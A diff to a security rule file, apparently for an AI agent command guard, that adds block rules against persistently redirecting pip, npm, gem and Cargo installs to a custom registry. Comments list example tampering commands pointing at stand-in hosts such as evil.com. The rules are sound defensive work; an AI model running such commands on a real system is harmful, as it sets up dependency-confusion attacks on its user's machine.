@@ -149,6 +149,94 @@ rules:
     decision: "BLOCK"
     reason: "Modification of .pypirc blocked — may redirect package resolution."
 
+  # === BLOCK: pip.conf / pip.ini persistent index-url override (issue #574) ===
+  #
+  # ~/.pip/pip.conf or ~/.config/pip/pip.conf stores the default PyPI index.
+  # Writing [global] index-url/extra-index-url to this file redirects ALL
+  # future pip installs (even after AgentShield restarts) to a malicious
+  # registry — a persistent dependency confusion setup.
+  #
+  # Examples:
+  #   echo '[global]\nindex-url = http://evil.com/simple/' > ~/.pip/pip.conf
+  #   tee ~/.config/pip/pip.conf <<< '[global]\nextra-index-url = http://evil.com/'
+  #   sed -i 's|index-url.*|index-url = http://evil.com/|' /etc/pip.conf
+  - id: "sc-block-pip-conf-write"
+    taxonomy: "supply-chain/config-tampering/package-config-edit"
+    match:
+      command_regex: "(echo|printf|tee|sed|awk)\\b.*(pip\\.conf|pip\\.ini)"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Write to pip.conf/pip.ini — persistently redirects all future pip installs to a custom index URL, enabling dependency confusion attacks that survive AgentShield restarts. MITRE T1195.001, CWE-829."
+
+  # === BLOCK: npm config set registry to non-standard URL (issue #574) ===
+  #
+  # `npm config set registry <url>` persists the registry URL to ~/.npmrc,
+  # redirecting all future npm install commands. Unlike `npm install --registry`
+  # (per-command, already blocked), this is a persistent system-wide change.
+  #
+  # Examples:
+  #   npm config set registry http://evil-registry.com
+  #   npm config set registry https://attacker.example.com/
+  - id: "sc-block-npm-config-set-registry"
+    taxonomy: "supply-chain/config-tampering/package-config-edit"
+    match:
+      command_regex: "npm\\s+config\\s+set\\s+registry\\s+https?://"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "npm config set registry — persistently overrides the npm registry in ~/.npmrc, redirecting all future installs to a potentially malicious source. MITRE T1195.001."
+
+  # === BLOCK: gem sources --add malicious gem source (issue #574) ===
+  #
+  # `gem sources --add <url>` appends a gem source to the global gem config.
+  # Combined with `gem sources --remove https://rubygems.org/` this fully
+  # redirects gem downloads. Even without removal, the added source can be
+  # used for version shadowing (higher-versioned malicious gems win).
+  #
+  # Examples:
+  #   gem sources --add http://evil-gems.example.com/
+  #   gem sources --add https://internal.example.com/ --remove https://rubygems.org/
+  - id: "sc-block-gem-sources-add"
+    taxonomy: "supply-chain/config-tampering/package-config-edit"
+    match:
+      command_regex: "gem\\s+sources\\s+--add\\s+https?://"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "gem sources --add — adds a custom gem source globally, enabling dependency shadowing where a malicious higher-versioned gem can be installed instead of the legitimate package. MITRE T1195.001."
+
+  # === BLOCK: ~/.gemrc persistent source override (issue #574) ===
+  #
+  # ~/.gemrc can set `:sources: [url]` to replace the default rubygems.org
+  # source. Writing this file redirects gem installs similar to pip.conf.
+  #
+  # Examples:
+  #   echo ':sources: ["http://evil.com/"]' > ~/.gemrc
+  #   tee ~/.gemrc <<< ':sources: ["http://evil-gems.com/"]'
+  - id: "sc-block-gemrc-write"
+    taxonomy: "supply-chain/config-tampering/package-config-edit"
+    match:
+      command_regex: "(echo|printf|tee|sed|awk)\\b.*\\.gemrc"
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "Write to ~/.gemrc — persistently overrides gem sources, enabling dependency confusion attacks on all subsequent gem installs. MITRE T1195.001."
+
+  # === BLOCK: Cargo config.toml source replacement (issue #574) ===
+  #
+  # ~/.cargo/config.toml can set [source.crates-io] replace-with = "evil"
+  # to silently redirect all `cargo install` and `cargo add` downloads to
+  # a custom registry. Writing to this file is a persistent supply chain
+  # setup that survives reboots.
+  #
+  # Examples:
+  #   echo '[source.crates-io]\nreplace-with = "evil"' >> ~/.cargo/config.toml
+  #   sed -i 's|replace-with.*|replace-with = "evil-registry"|' .cargo/config.toml
+  - id: "sc-block-cargo-config-write"
+    taxonomy: "supply-chain/config-tampering/package-config-edit"
+    match:
+      command_regex: "(echo|printf|tee|sed|awk)\\b.*(cargo[/\\\\]config(\\.toml)?)"
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "Write to Cargo config.toml — the [source.crates-io] replace-with field redirects all cargo downloads to a custom registry, enabling persistent dependency confusion. MITRE T1195.001."
+
   - id: "sc-block-go-mod-replace"
     taxonomy: "supply-chain/config-tampering/package-config-edit"
     match:
